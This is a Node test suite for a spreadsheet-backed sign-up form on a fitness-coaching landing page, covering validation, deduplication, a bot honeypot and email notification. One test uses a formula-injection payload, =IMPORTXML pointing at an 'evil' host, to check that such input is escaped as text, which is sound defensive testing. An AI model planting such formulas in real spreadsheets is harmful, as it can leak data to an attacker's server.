// node --test apps/landing/sheets/test/code.test.mjs
import test from 'node:test';
import assert from 'node:assert/strict';
import { loadScript } from './harness.mjs';

const good = { name: 'Rahul Verma', contact: 'rahul@example.com', mode: 'Hybrid', clients: '10 to 20', page: 'https://fitbud.example/' };

test('a valid sign-up becomes one row under the headers', () => {
  const s = loadScript();
  assert.deepEqual(s.post(good), { ok: true });
  assert.equal(s.rows.length, 2);
  assert.deepEqual(s.rows[0].slice(0, 7), ['Submitted', 'Name', 'Contact', 'Contact type', 'Coaching mode', 'Clients', 'Status']);
  const [when, name, contact, type, mode, clients, status] = s.rows[1];
  assert.equal(Object.prototype.toString.call(when), '[object Date]');
  assert.deepEqual([name, contact, type, mode, clients, status], ['Rahul Verma', 'rahul@example.com', 'Email', 'Hybrid', '10 to 20', 'New']);
});

test('each coaching mode is accepted and kept as given', () => {
  const s = loadScript();
  ['Online', 'Hybrid', 'In person'].forEach((mode, i) => s.post({ ...good, contact: `t${i}@example.com`, mode }));
  assert.deepEqual(s.rows.slice(1).map((r) => r[4]), ['Online', 'Hybrid', 'In person']);
});

test('a WhatsApp number is accepted and labelled', () => {
  const s = loadScript();
  assert.equal(s.post({ ...good, contact: '+91 98765 43210' }).ok, true);
  assert.equal(s.rows[1][3], 'WhatsApp');
  assert.equal(s.rows[1][2], "'+91 98765 43210"); // shown as +91 98765 43210, kept as text
});

test('the same person twice keeps one row and refreshes their answers', () => {
  const s = loadScript();
  s.post({ ...good, contact: '+91 98765 43210' });
  assert.deepEqual(s.post({ ...good, contact: '98765 43210', mode: 'Online', clients: '20+' }), { ok: true, duplicate: true });
  assert.equal(s.rows.length, 2);
  assert.deepEqual(s.rows[1].slice(4, 6), ['Online', '20+']);
  s.post({ ...good, contact: 'RAHUL@example.com ' });
  s.post({ ...good, contact: 'rahul@example.com' });
  assert.equal(s.rows.length, 3);
});

test('missing or unexpected values are refused and nothing is stored', () => {
  const s = loadScript();
  assert.equal(s.post({ ...good, name: '  ' }).error, 'name_required');
  assert.equal(s.post({ ...good, contact: 'not a contact' }).error, 'contact_invalid');
  assert.equal(s.post({ ...good, mode: 'Telepathy' }).error, 'mode_invalid');
  assert.equal(s.post({ ...good, mode: undefined }).error, 'mode_invalid');
  assert.equal(s.post({ ...good, clients: '1000' }).error, 'clients_invalid');
  assert.equal(s.rows.length, 0);
});

test('bots that fill the hidden field get ok but are not stored', () => {
  const s = loadScript();
  assert.deepEqual(s.post({ ...good, website: 'http://spam.example' }), { ok: true });
  assert.equal(s.rows.length, 0);
});

test('formula-looking input is stored as text', () => {
  const s = loadScript();
  s.post({ ...good, name: '=IMPORTXML("http://evil","//a")' });
  assert.equal(s.rows[1][1], '\'=IMPORTXML("http://evil","//a")');
});

test('optional email notification', () => {
  const off = loadScript();
  off.post(good);
  assert.equal(off.mail.length, 0);
  const on = loadScript({ notifyEmail: 'team@fitbud.example' });
  on.post(good);
  assert.equal(on.mail.length, 1);
  assert.match(on.mail[0].body, /Rahul Verma \(Hybrid, 10 to 20 clients\)/);
});

test('setup and health check run', () => {
  const s = loadScript();
  s.setup();
  assert.equal(s.rows[0][0], 'Submitted');
  assert.deepEqual(s.get(), { ok: true, service: 'fitbud-early-access' });
});
